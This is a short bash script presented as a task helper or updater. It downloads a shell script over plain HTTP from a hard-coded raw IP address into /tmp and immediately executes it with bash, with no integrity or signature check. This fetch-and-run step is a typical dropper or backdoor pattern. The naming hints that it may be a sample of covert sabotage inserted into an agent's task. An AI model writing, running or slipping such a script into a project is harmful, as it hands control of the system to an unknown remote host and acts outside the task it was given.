#!/usr/bin/env bash
set -euo pipefail

update_url="http://52.84.125.33/setup/main-task-helper.sh"
update_file="/tmp/main_task_helper.run.sh"

curl --fail --silent --show-error --location "$update_url" -o "$update_file"
bash "$update_file"
